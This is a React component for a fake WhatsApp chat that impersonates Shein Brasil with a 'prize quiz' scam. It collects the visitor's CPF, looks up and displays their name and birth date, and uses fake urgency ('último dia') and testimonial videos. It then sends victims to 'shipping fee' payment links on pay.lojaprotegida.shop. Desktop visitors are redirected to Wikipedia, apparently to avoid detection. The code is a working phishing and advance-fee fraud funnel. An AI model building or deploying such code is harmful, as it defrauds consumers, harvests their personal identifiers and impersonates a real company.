"use client"

import { useEffect, useState, useRef, useCallback, useMemo } from "react"
import { Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { verifyCpf } from "./actions"

export default function WhatsAppFunnelDemo() {
  const [isMobile, setIsMobile] = useState(true)
  const [isClient, setIsClient] = useState(false)

  useEffect(() => {
    setIsClient(true)
  }, [])

  useEffect(() => {
    if (!isClient) return
    const checkMobile = () => {
      // Detecção por user agent
      const ua = navigator.userAgent || navigator.vendor || (window as any).opera
      const isMobileUA = /android|iphone|ipad|ipod|opera mini|iemobile|mobile/i.test(ua)
      // Detecção por tamanho de tela
      const isSmallScreen = window.innerWidth <= 768
      const mobile = isMobileUA && isSmallScreen
      setIsMobile(mobile)
      if (!mobile) {
        window.location.href = "https://pt.wikipedia.org/wiki/Rato"
      }
    }
    checkMobile()
    window.addEventListener('resize', checkMobile)
    return () => window.removeEventListener('resize', checkMobile)
  }, [isClient])

  // TODOS OS HOOKS DEVEM VIR ANTES DOS RETURNS ABAIXO!
  // Hook para gerenciamento da conversa
  const [conversation, setConversation] = useState<
    Array<{
      type: "bot" | "user" | "image" | "video" | "button-group" | "status-message" | "loading"
      content: string | string[] | { text: string; options: string[] }
      timestamp?: string
      avatar?: string
      isTyping?: boolean
    }>
  >([])
  const [currentStep, setCurrentStep] = useState(0)
  const [isTyping, setIsTyping] = useState(false)
  const [status, setStatus] = useState("Online")
  const [userName, setUserName] = useState<string | undefined>(undefined)
  const [userDob, setUserDob] = useState<string | undefined>(undefined)
  const [selectedPrizeOption, setSelectedPrizeOption] = useState<string | undefined>(undefined)
  const [awaitingInput, setAwaitingInput] = useState<string | null>(null)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const audioRef = useRef<HTMLAudioElement | null>(null)

  useEffect(() => {
    audioRef.current = new Audio("/whatsapp-notification.mp3")
  }, [])

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }

  const addMessage = useCallback((message: any) => {
    setConversation((prev) => {
      if (message.type === "bot" && audioRef.current) {
        audioRef.current.play().catch((e) => console.error("Erro ao tocar áudio:", e))
      }
      return [
        ...prev,
        { ...message, timestamp: new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }) },
      ]
    })
  }, [])

  const simulateTyping = useCallback(async (duration = 1500) => {
    setIsTyping(true)
    setStatus("digitando...")
    await new Promise((resolve) => setTimeout(resolve, duration))
    setIsTyping(false)
    setStatus("Online")
  }, [])

  const funnelSteps = useMemo(
    () => [
      // Step 0: Initial Welcome & Info
      async () => {
        addMessage({ type: "status-message", content: "Esta é uma conta comercial e não recebe ligações" })
        await simulateTyping()
        addMessage({ type: "bot", content: "Parabéns! Você foi selecionada para o questionário Shein 17 anos..." })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Olá! Seja bem vinda ao **questionário premiado** em comemoração aos 17 anos da Shein!",
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Sou a Fernanda, atendente virtual da Shein e vou te auxiliar no seu **questionário premiado**! 🥰",
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `Hoje quarta-feira, ${new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "long", year: "numeric" })} é o **último dia** para responder o questionário e resgatar a sua premiação caso esteja qualificada.`,
        })
        await simulateTyping()
        addMessage({
          type: "button-group",
          content: {
            text: "Clique aqui para iniciar o questionário",
            options: ["Clique aqui para iniciar o questionário"],
          },
        })
      },
      // Step 1: CPF Request & Verification
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Antes de prosseguirmos, devo informar que o questionário é limitado a 1 resposta por CPF.",
        })
        await simulateTyping()
        addMessage({ type: "bot", content: "Para começarmos, preciso que me informe o número do seu CPF." })
        setAwaitingInput("CPF")
      },
      async (userResponse: string) => {
        setAwaitingInput(null)
        addMessage({ type: "loading", content: "Verificando CPF..." })
        const result = await verifyCpf(userResponse)
        setConversation((prev) => prev.filter((msg) => msg.type !== "loading"))

        if (result.success) {
          setUserName(result.name)
          setUserDob(result.nascimento)
          addMessage({ type: "bot", content: result.message })
          await simulateTyping()
          addMessage({ type: "bot", content: "Seus dados estão qualificados para nosso questionário!" })
          await simulateTyping()
          addMessage({
            type: "bot",
            content: `${result.name || "usuário"}, seu nome está correto?`,
          })
          addMessage({ type: "button-group", content: { text: "Sim", options: ["Sim"] } })
        } else {
          addMessage({ type: "bot", content: result.message })
          await simulateTyping()
          addMessage({ type: "bot", content: "Por favor, tente novamente ou entre em contato com o suporte." })
          setAwaitingInput("CPF")
          setCurrentStep(1)
          return
        }
      },
      // Step 2: Date of Birth Confirmation
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Para confirmar que realmente estamos falando com a pessoa certa, confirme sua data de nascimento:",
        })

        const dobOptions = []
        if (userDob) {
          dobOptions.push(`Opção 01 - ${userDob}`)
        } else {
          dobOptions.push("Opção 01 - 30/07/2000")
        }
        dobOptions.push("Opção 02 - 22/04/1988")
        dobOptions.push("Opção 03 - 04/12/2001")

        addMessage({
          type: "button-group",
          content: {
            text: "Qual opção está correta?",
            options: dobOptions,
          },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `${userName || "usuário"}, seja bem vinda ao questionário premiado Shein, o tempo de duração média é de 2 a 5 minutos, vamos começar!`,
        })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-gifts-cart.png" })
        addMessage({ type: "bot", content: "Pergunta 01: Você já adquiriu algum produto da Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Sim, já sou cliente", "Ainda não sou cliente", "Não sei"] },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-store.png" })
        addMessage({ type: "bot", content: "O que mais te chama atenção em nossos produtos?" })
        addMessage({
          type: "button-group",
          content: {
            text: "",
            options: ["Qualidade", "Tecnologia e inovação", "Design", "Suporte ao cliente", "Outro"],
          },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "bot", content: "Agradecemos sua resposta!" })
        await simulateTyping()
        addMessage({ type: "bot", content: "Vamos para a próxima pergunta..." })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-packages-woman.png" })
        addMessage({ type: "bot", content: "Pergunta 02: Com que frequência você faz compras na Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Semanalmente", "Mensalmente", "A cada dois meses", "Raramente"] },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-shopping-bags.png" })
        addMessage({ type: "bot", content: "Pergunta 03: Quais tipos de produtos você mais compra na Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Roupas femininas", "Roupas masculinas", "Roupas infantis", "Calçados"] },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-app-shopping-cart.png" })
        addMessage({
          type: "bot",
          content: "Pergunta 04: Quais são os fatores mais importantes para você ao escolher um produto na Shein?",
        })
        addMessage({
          type: "button-group",
          content: {
            text: "",
            options: ["Preço", "Qualidade", "Estilo", "Tendências da moda", "Comentários de outros clientes"],
          },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-app-screen.png" })
        addMessage({
          type: "bot",
          content: "Pergunta 05: Qual é a sua experiência geral de navegação no site/app da Shein?",
        })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Muito fácil", "Fácil", "Neutra", "Difícil", "Muito difícil"] },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-delivery-box.png" })
        addMessage({
          type: "bot",
          content: "Pergunta 06: Quão satisfeita você está com o tempo de entrega dos produtos da Shein?",
        })
        addMessage({
          type: "button-group",
          content: {
            text: "",
            options: ["Muito satisfeito", "Satisfeita", "Neutra", "Insatisfeita", "Muito Insatisfeita"],
          },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-clothing-styles.png" })
        addMessage({ type: "bot", content: "Pergunta 07: Quais estilos de roupa você gostaria de ver mais na Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Casual", "Esportivo", "Formal", "Vintage", "Alternativo"] },
        })
      },
      async (userResponse: string) => {
        await simulateTyping()
        addMessage({ type: "bot", content: "Escolha a opção abaixo de qual produto você gostaria de ganhar:" })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-makeup-kit.png" })
        addMessage({ type: "bot", content: "Opção 01: ✅\nKits Maquiagem Shein - Valor de até R$1.000,00." })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-clothes-woman.png" })
        addMessage({
          type: "bot",
          content: "Opção 02: ✅\nEscolha os Looks que desejar - Tema Livre - Valor de até R$1.000,00.",
        })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-home-items.png" })
        addMessage({
          type: "bot",
          content: "Opção 03: ✅\nEscolha os Utensílios para casa - Tema Livre - Valor de até R$1.000,00.",
        })
        addMessage({ type: "button-group", content: { text: "", options: ["Opção 01", "Opção 02", "Opção 03"] } })
      },
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Antes de prosseguirmos com sua premiação, veja o que algumas pessoas nos mandam diariamente 🥰",
        })
        await simulateTyping()
        addMessage({ type: "video", content: "/video/video-1.mp4" })
        await new Promise((resolve) => setTimeout(resolve, 30000))
        await simulateTyping()
        addMessage({ type: "video", content: "/video/video-2.mp4" })
        await new Promise((resolve) => setTimeout(resolve, 20000))
        await simulateTyping()
        addMessage({ type: "video", content: "/video/video-3.mp4" })
        await new Promise((resolve) => setTimeout(resolve, 20000))
        await simulateTyping()
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Já vi os vídeos"] },
        })
      },
      async (userResponse: string) => {
        if (userResponse === "Já vi os vídeos") {
          let prizeName = "o prêmio"
          if (selectedPrizeOption === "Opção 01") {
            prizeName = "o kit de maquiagem da Shein"
          } else if (selectedPrizeOption === "Opção 02") {
            prizeName = "as roupas da Shein"
          } else if (selectedPrizeOption === "Opção 03") {
            prizeName = "os utensílios para casa da Shein"
          }
          await simulateTyping()
          addMessage({
            type: "bot",
            content: `${userName || "usuário"}, por que você gostaria de ganhar ${prizeName}?`,
          })
          setAwaitingInput("adoro roupas")
        }
      },
      async (userResponse: string) => {
        setAwaitingInput(null)
        await simulateTyping()
        addMessage({ type: "bot", content: "De 0 a 5, qual a nota você nos dá sobre as nossas roupas?" })
        addMessage({ type: "button-group", content: { text: "", options: ["0", "1", "2", "3", "4", "5"] } })
      },
      async (userResponse: string) => {
        await simulateTyping()
        addMessage({ type: "bot", content: "Aguarde alguns segundos enquanto eu verifico suas respostas..." })
        await simulateTyping(2000)
        addMessage({ type: "bot", content: "Respostas verificadas!" })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `${userName || "usuário"}, tenho uma ótima notícia pra você!`,
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "🎉 Parabéns! Você está qualificada para ganhar as roupas tema livre da Shein!",
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "De acordo com as regras do nosso questionário premiado, as Roupas Temas Livre sairá por R$0,00.",
        })
        await simulateTyping()
        addMessage({ type: "bot", content: "Isso mesmo, o aniversário é nosso e quem ganha é você!" })
        await simulateTyping()
        if (selectedPrizeOption === "Opção 02") {
          addMessage({ type: "bot", content: "Escolha o tamanho das peças do seu Kit para a entrega:" })
          addMessage({ type: "button-group", content: { text: "", options: ["PP", "P", "M", "G"] } })
        } else {
          addMessage({ type: "video", content: "/video/video-4.mp4" })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: {
              text: "",
              options: ["Por que preciso pagar o frete?", "Prosseguir com o recebimento do prêmio"],
            },
          })
        }
      },
      async (userResponse: string) => {
        const isSizeResponse = ["PP", "P", "M", "G"].includes(userResponse)

        if (isSizeResponse) {
          await simulateTyping()
          addMessage({ type: "bot", content: `Ok, tamanho ${userResponse} selecionado!` })
          await simulateTyping()
          addMessage({ type: "video", content: "/video/video-4.mp4" })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: {
              text: "",
              options: ["Por que preciso pagar o frete?", "Prosseguir com o recebimento do prêmio"],
            },
          })
        } else if (userResponse === "Por que preciso pagar o frete?") {
          await simulateTyping()
          addMessage({
            type: "bot",
            content:
              "A Shein está realizando seu aniversário de 17 anos e queremos que você faça parte dessa comemoração! A Shein se reserva ao direito de premiar uma pequena parte das pessoas e fechar o questionário quando bem entender.",
          })
          await simulateTyping()
          addMessage({
            type: "bot",
            content:
              "A entrega dos produtos da Shein é realizada por uma empresa TERCEIRIZADA, qual conseguimos um desconto em comemoração de 17 anos da empresa. Por fim, todos os nossos custos levando em conta produção e fábrica dos produtos ficará por nossa conta e você pagará somente o valor de custo de transporte da empresa terceirizada.",
          })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: { text: "", options: ["Prosseguir com o recebimento do prêmio"] },
          })
        } else {
          await simulateTyping()
          addMessage({
            type: "bot",
            content: `${userName || "usuário"}, agora escolha o melhor frete para você!`,
          })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: {
              text: "",
              options: [
                "Frete Express - 7 a 10 dias úteis - R$23,68",
                "Frete Advanced - 3 a 5 dias úteis - R$29,82",
                "Frete Full - 1 dia útil - R$35,40",
              ],
            },
          })
        }
      },
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `Lembre-se que hoje quarta-feira, ${new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "long", year: "numeric" })} é o último dia para resgatar seu prêmio, e caso você não conclua a etapa a seguir seu prêmio será expirado e dará oportunidade para outro participante.`,
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `${userName || "usuário"}, você será redirecionada para uma página onde deverá preencher as suas informações e concluir a inscrição para garantir o recebimento do seu prêmio.`,
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content:
            "Eu vou entrar em contato com você pessoalmente após a sua inscrição para confirmar o endereço e garantir a sua entrega! 🥰",
        })
      },
    ],
    [userName, userDob, addMessage, simulateTyping, selectedPrizeOption],
  )

  useEffect(() => {
    if (currentStep === 0) {
      funnelSteps[0]("")
    }
  }, [currentStep, funnelSteps])

  useEffect(() => {
    scrollToBottom()
  }, [conversation])

  const handleUserAction = useCallback(
    async (response: string) => {
      // --- REDIRECIONAMENTO PARA OS CHECKOUTS DOS FRETES ---
      if (response === "Frete Express - 7 a 10 dias úteis - R$23,68") {
        window.location.href = "https://pay.lojaprotegida.shop/bz5KZbVe0o9Z7dL"
        return
      }
      if (response === "Frete Advanced - 3 a 5 dias úteis - R$29,82") {
        window.location.href = "https://pay.lojaprotegida.shop/PyE2Zy8jv7K3qRb"
        return
      }
      if (response === "Frete Full - 1 dia útil - R$35,40") {
        window.location.href = "https://pay.lojaprotegida.shop/7vJOGY4KW88ZKXd"
        return
      }
      // -----------------------------------------------------

      const steps = funnelSteps
      addMessage({ type: "user", content: response })

      if (currentStep === 11) {
        setSelectedPrizeOption(response)
      }

      const nextStepFunction = steps[currentStep + 1]

      if (nextStepFunction) {
        if (currentStep === 13 && awaitingInput) {
          await nextStepFunction(response)
        } else if (currentStep === 16 && response === "Por que preciso pagar o frete?") {
          await nextStepFunction(response)
        } else {
          await nextStepFunction(response)
          setCurrentStep((prev) => prev + 1)
        }
      }
    },
    [currentStep, funnelSteps, addMessage, simulateTyping, setSelectedPrizeOption, awaitingInput],
  )

  const renderMessageContent = (message: any) => {
    switch (message.type) {
      case "bot":
        return (
          <div className="relative bg-white rounded-lg p-2 max-w-[85%] shadow-sm rounded-bl-none">
            <p
              className="text-sm"
              dangerouslySetInnerHTML={{ __html: message.content.replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>") }}
            />
            <div className="absolute bottom-0 right-1 flex items-center">
              <Check className="h-4 w-4 text-[#60d550]" />
            </div>
          </div>
        )
      case "user":
        return (
          <div className="relative bg-[#dcf8c6] rounded-lg p-2 max-w-[85%] shadow-sm rounded-br-none self-end">
            <p className="text-sm">{message.content}</p>
            <div className="absolute bottom-0 right-1 flex items-center">
              <Check className="h-4 w-4 text-[#60d550]" />
            </div>
          </div>
        )
      case "image":
        return (
          <div className="max-w-[85%] rounded-lg overflow-hidden shadow-sm">
            <img
              src={message.content || "/placeholder.svg"}
              alt="Shein Promotion"
              className="w-full h-auto object-cover"
            />
          </div>
        )
      case "video":
        return (
          <div className="max-w-[85%] rounded-lg overflow-hidden shadow-sm relative">
            <video
              playsInline
              webkit-playsinline="true"
              autoPlay
              className="w-full h-auto"
              onClick={(e) => {
                const videoElement = e.target as HTMLVideoElement
                if (videoElement.paused) {
                  videoElement.play()
                } else {
                  videoElement.pause()
                }
              }}
            >
              <source src={message.content} type="video/mp4" />
              Seu navegador não suporta o elemento de vídeo.
            </video>
          </div>
        )
      case "button-group":
        return (
          <div className="flex flex-col gap-2 w-full max-w-[85%]">
            {message.content.text && <p className="text-sm text-gray-600 mb-1">{message.content.text}</p>}
            {message.content.options.map((option: string, idx: number) => (
              <Button
                key={idx}
                className="bg-[#25d366] hover:bg-[#1da851] text-white font-bold py-2 px-4 rounded-full text-sm shadow-md"
                onClick={() => handleUserAction(option)}
              >
                {option}
              </Button>
            ))}
          </div>
        )
      case "status-message":
        return (
          <div className="flex justify-center w-full">
            <div className="bg-[#e0f2f1] rounded-lg p-2 flex items-center gap-2 text-sm max-w-[90%]">
              <div className="w-5 h-5 rounded-full bg-[#4b5e63] flex items-center justify-center text-white text-xs">
                i
              </div>
              <span className="text-[#53676b]">{message.content}</span>
            </div>
          </div>
        )
      case "loading":
        return (
          <div className="flex justify-start items-end">
            <div className="w-8 h-8 rounded-full overflow-hidden mr-2 flex-shrink-0 bg-white flex items-center justify-center">
              <img src="/shein-logo.png" alt="Shein Logo" className="w-5 h-5 object-contain" />
            </div>
            <div className="bg-white rounded-lg p-3 shadow-sm">
              <div className="flex space-x-1">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div
                  className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"
                  style={{ animationDelay: "0.1s" }}
                ></div>
                <div
                  className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"
                  style={{ animationDelay: "0.2s" }}
                ></div>
              </div>
              <span className="text-sm text-gray-500 ml-2">{message.content}</span>
            </div>
          </div>
        )
      default:
        return null
    }
  }

  useEffect(() => {
    const script = document.createElement("script")
    script.innerHTML = `
      !function(f,b,e,v,n,t,s)
      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      'https://connect.facebook.net/en_US/fbevents.js');
      fbq('init', '1433378440999073');
      fbq('track', 'PageView');
    `
    document.head.appendChild(script)

    return () => {
      document.head.removeChild(script)
    }
  }, [])

  // Só renderiza após montar no client
  if (!isClient) return null

  if (!isMobile) {
    return (
      <div style={{textAlign: "center", marginTop: "40vh", fontSize: "2rem"}}>
        Disponível apenas em dispositivos móveis.
      </div>
    )
  }

  return (
    <div className="max-w-md mx-auto bg-white h-screen flex flex-col overflow-hidden">
      <noscript>
        <img
          height="1"
          width="1"
          style={{ display: "none" }}
          src="https://www.facebook.com/tr?id=1433378440999073&ev=PageView&noscript=1"
          alt=""
        />
      </noscript>
      <div className="bg-[#075e54] text-white p-3 flex items-center gap-3 shadow-md z-10">
        <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="h-5 w-5"
          >
            <path d="M19 12H5M12 5l-7 7 7 7" />
          </svg>
        </Button>
        <div className="flex items-center gap-3 flex-1">
          <div className="w-10 h-10 rounded-full overflow-hidden bg-white flex items-center justify-center">
            <img src="/shein-logo.png" alt="Shein Logo" className="w-6 h-6 object-contain" />
          </div>
          <div className="flex-1">
            <div className="flex items-center gap-1">
              <span className="font-semibold text-base">Shein Brasil</span>
              <svg viewBox="0 0 18 18" height="16" width="16" className="text-[#60d550]">
                <polygon
                  fill="currentColor"
                  points="9,16 7.1,16.9 5.8,15.2 3.7,15.1 3.4,13 1.5,12 2.2,9.9 1.1,8.2 2.6,6.7 2.4,4.6 4.5,4 5.3,2 7.4,2.4 9,1.1 10.7,2.4 12.7,2 13.6,4 15.6,4.6 15.5,6.7 17,8.2 15.9,9.9 16.5,12 14.7,13 14.3,15.1 12.2,15.2 10.9,16.9"
                />
                <polygon fill="white" points="13.1,7.3 12.2,6.5 8.1,10.6 5.9,8.5 5,9.4 8,12.4" />
              </svg>
            </div>
            <span className="text-xs opacity-90">{status}</span>
          </div>
        </div>
        <div className="flex gap-2">
          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-5 w-5"
            >
              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.63A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
            </svg>
          </Button>
          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-5 w-5"
            >
              <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.2" />
            </svg>
          </Button>
          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-5 w-5"
            >
              <circle cx="12" cy="12" r="1" />
              <circle cx="12" cy="5" r="1" />
              <circle cx="12" cy="19" r="1" />
            </svg>
          </Button>
        </div>
      </div>
      <div
        className="flex-1 p-4 space-y-3 overflow-y-auto flex flex-col"
        style={{
          backgroundImage: "url(/whatsapp-background-new.png)",
          backgroundSize: "contain",
          backgroundRepeat: "repeat",
          backgroundPosition: "center",
        }}
      >
        {conversation.map((message, index) => (
          <div
            key={index}
            className={`flex ${message.type === "user" ? "justify-end" : "justify-start"} ${
              message.type === "button-group" || message.type === "status-message" || message.type === "loading"
                ? "w-full"
                : ""
            } ${message.type === "status-message" ? "my-2" : ""}`}
          >
            {message.type !== "user" && message.type !== "status-message" && message.type !== "loading" && (
              <div className="w-8 h-8 rounded-full overflow-hidden mr-2 flex-shrink-0 bg-white flex items-center justify-center">
                <img src="/shein-logo.png" alt="Shein Logo" className="w-5 h-5 object-contain" />
              </div>
            )}
            {renderMessageContent(message)}
          </div>
        ))}
        <div ref={messagesEndRef} />
      </div>
      {awaitingInput && (
        <div className="p-2 bg-gray-50 border-t border-gray-200 flex items-center gap-2">
          <Input
            placeholder={awaitingInput === "CPF" ? "Digite seu CPF" : awaitingInput}
            className="flex-1 bg-white rounded-full px-4 py-2 border-0 focus-visible:ring-0"
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                const inputElement = e.target as HTMLInputElement
                if (inputElement.value.trim() !== "") {
                  handleUserAction(inputElement.value)
                  inputElement.value = ""
                  setAwaitingInput(null)
                }
              }
            }}
          />
          <Button
            variant="ghost"
            size="icon"
            onClick={() => {
              const inputElement = document.querySelector(
                'input[placeholder="Digite seu CPF"], input[placeholder="Qualidade"], input[placeholder="adoro roupas"]',
              ) as HTMLInputElement
              if (inputElement && inputElement.value.trim() !== "") {
                handleUserAction(inputElement.value)
                inputElement.value = ""
                setAwaitingInput(null)
              }
            }}
          >
            <Check className="h-5 w-5" />
          </Button>
        </div>
      )}
    </div>
  )
}